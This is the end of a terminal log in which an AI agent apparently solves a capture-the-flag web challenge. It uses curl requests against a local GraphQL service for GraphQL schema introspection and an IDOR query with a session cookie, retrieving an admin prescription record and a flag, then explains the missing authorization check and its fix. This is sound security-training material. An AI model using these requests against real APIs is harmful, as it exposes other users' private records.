[32m│[0m curl -X POST http://127.0.0.1:5003/graphql -H "Cookie: session=..." -H       [32m│[0m
[32m│[0m "Content-Type: application/json" -d '{"query":"{ __schema { types { name     [32m│[0m
[32m│[0m fields { name } } } }"}'                                                     [32m│[0m
[32m│[0m Response:                                                                    [32m│[0m
[32m│[0m {"data":{"__schema":{"types":[...,{"name":"PrescriptionType","fields":[{"nam [32m│[0m
[32m│[0m e":"id"},{"name":"userId"},{"name":"prescriptionDetails"},{"name":"flag"}]}, [32m│[0m
[32m│[0m ...]}}}                                                                      [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m # IDOR Exploitation - Querying admin's prescriptions                         [32m│[0m
[32m│[0m curl -X POST http://127.0.0.1:5003/graphql -H "Cookie:                       [32m│[0m
[32m│[0m session=.eJwlzkEOAjEIAMC_9OyB0kJhP7OhFKLXXfdk_LsaHzDJvMqeR5z3sj2PK25lf6yylYW [32m│[0m
[32m│[0m QVdyWa9VMVQ5sTSWWWDbrk2WBU040no5t4HSiMZhThK2KqluCEKn_aAjWxCYKmFY9eWEPqJOCYXa [32m│[0m
[32m│[0m LrkC-Ong6G1mWb-Q64_hvsLw__kMwDw.aVhydw.9sVw80B4flMe_MGCCpb104uFJNo" -H       [32m│[0m
[32m│[0m "Content-Type: application/json" -d '{"query":"query {                       [32m│[0m
[32m│[0m getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}'      [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m Response includes:                                                           [32m│[0m
[32m│[0m {"id":43,"userId":1,"prescriptionDetails":"Prescription 43 for               [32m│[0m
[32m│[0m Admin","flag":"FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fe [32m│[0m
[32m│[0m c5949b8d}"}                                                                  [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m FLAG FOUND:                                                                  [32m│[0m
[32m│[0m FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}       [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### confidence_score                                                         [32m│[0m
[32m│[0m 1.0                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### thoughts                                                                 [32m│[0m
[32m│[0m The vulnerability was an Insecure Direct Object Reference (IDOR) in the      [32m│[0m
[32m│[0m GraphQL API. The application properly authenticated users (user/user with    [32m│[0m
[32m│[0m userId 2), but failed to implement authorization checks on the               [32m│[0m
[32m│[0m `getPrescriptions` query. This allowed me to query prescriptions for any     [32m│[0m
[32m│[0m userId by simply changing the parameter value from 2 to 1.                   [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m The HTML source code provided important hints:                               [32m│[0m
[32m│[0m - The `/add_prescription` page showed the GraphQL mutation requesting the    [32m│[0m
[32m│[0m `flag` field                                                                 [32m│[0m
[32m│[0m - The `/view_prescriptions` page had a comment "dont pass flag in query      [32m│[0m
[32m│[0m parameter because it will fetched" and "viewing the source always help"      [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m This is a classic broken access control vulnerability where authentication   [32m│[0m
[32m│[0m is present but authorization is missing. The fix would be to validate that   [32m│[0m
[32m│[0m the authenticated user's session userId matches the requested userId in the  [32m│[0m
[32m│[0m GraphQL query, or implement proper role-based access control.                [32m│[0m
